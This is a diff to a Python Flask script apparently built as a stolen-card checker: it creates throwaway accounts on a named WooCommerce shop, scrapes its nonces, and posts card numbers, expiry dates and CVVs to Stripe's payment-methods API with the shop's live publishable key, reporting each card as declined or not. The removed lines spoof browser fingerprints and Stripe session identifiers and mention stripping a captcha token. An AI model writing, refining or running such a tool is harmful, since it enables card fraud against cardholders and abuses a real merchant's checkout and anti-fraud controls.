@@ -3,53 +3,14 @@ import requests
 import re
 import random
 import string
-import time
 
 app = Flask(__name__)
 
-def generate_dynamic_stripe_params():
-    """Generate dynamic parameters for Stripe request"""
-    timestamp = str(int(time.time() * 1000))
-    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-    
-    return {
-        'guid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + random_id,
-        'muid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + random_id,
-        'sid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + random_id,
-        'client_session_id': ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '-' + 
-                           ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + 
-                           ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + 
-                           ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + 
-                           ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)),
-        'elements_session_config_id': ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '-' + 
-                                    ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + 
-                                    ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + 
-                                    ''.join(random.choices(string.ascii_lowercase + string.digits, k=4)) + '-' + 
-                                    ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)),
-        'time_on_page': str(random.randint(100000, 500000))
-    }
-
 def full_stripe_check(cc, mm, yy, cvv):
     session = requests.Session()
-    
-    # Generate dynamic parameters
-    dynamic_params = generate_dynamic_stripe_params()
-    
-    # Set headers for Stripe request
-    stripe_headers = {
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-    }
+    session.headers.update({
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
+    })
 
     if len(yy) == 4:
         yy = yy[-2:]
@@ -68,14 +29,12 @@ def full_stripe_check(cc, mm, yy, cvv):
             'email': random_email, 
             'password': 'Password123!', 
             'woocommerce-register-nonce': login_nonce,
-            '_wp_http_referer': '/account/', 
+            '_wp_http_referer': '/my-account/', 
             'register': 'Register',
         }
-        reg_response = session.post('https://orevaa.com/my-account/', data=register_data)
+        reg_response = session.post('https://orevaa.com/my-account/', data=register_data, allow_redirects=False)
         
-        # Check if registration was successful
-        if reg_response.status_code != 200:
-            return {"status": "Declined", "response": "Failed to register account.", "decline_type": "process_error"}
+        # Don't check registration too strictly - just continue
 
         # Step 4: Get payment nonce
         payment_page_res = session.get('https://orevaa.com/my-account/add-payment-method/')
@@ -84,52 +43,27 @@ def full_stripe_check(cc, mm, yy, cvv):
             return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
         ajax_nonce = payment_nonce_match.group(1)
 
-        # Step 5: Get Stripe payment token - USING DYNAMIC PARAMETERS
+        # Step 5: Get Stripe payment token - SIMPLIFIED
         stripe_data = {
             'type': 'card',
             'card[number]': cc,
             'card[cvc]': cvv,
             'card[exp_year]': yy,
             'card[exp_month]': mm,
-            'allow_redisplay': 'unspecified',
-            'billing_details[address][country]': 'US',  # Changed from IN to US
-            'pasted_fields': 'number',
-            'payment_user_agent': 'stripe.js/fb4c8a3a98; stripe-js-v3/fb4c8a3a98; payment-element; deferred-intent',
-            'referrer': 'https://orevaa.com',
-            'time_on_page': dynamic_params['time_on_page'],
-            'client_attribution_metadata[client_session_id]': dynamic_params['client_session_id'],
-            'client_attribution_metadata[merchant_integration_source]': 'elements',
-            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
-            'client_attribution_metadata[merchant_integration_version]': '2021',
-            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
-            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
-            'client_attribution_metadata[elements_session_config_id]': dynamic_params['elements_session_config_id'],
-            'guid': dynamic_params['guid'],
-            'muid': dynamic_params['muid'],
-            'sid': dynamic_params['sid'],
-            'key': 'pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO',
-            '_stripe_version': '2024-06-20',
+            'key': 'pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO'
         }
-
-        # Remove hcaptcha_token as it's likely causing issues
-        # 'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1Qi...'  # REMOVED
         
-        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', 
-                                     headers=stripe_headers, data=stripe_data)
-        
-        print(f"Stripe Response Status: {stripe_response.status_code}")
-        print(f"Stripe Response: {stripe_response.text}")
+        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
         
         if stripe_response.status_code == 402:
             error_message = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
             return {"status": "Declined", "response": error_message, "decline_type": "card_decline"}
         
-        stripe_data = stripe_response.json()
-        payment_token = stripe_data.get('id')
+        stripe_json = stripe_response.json()
+        payment_token = stripe_json.get('id')
         
         if not payment_token:
-            error_msg = stripe_data.get('error', {}).get('message', 'Failed to retrieve Stripe token.')
-            return {"status": "Declined", "response": error_msg, "decline_type": "process_error"}
+            return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}
 
         # Step 6: Submit to website
         site_data = {
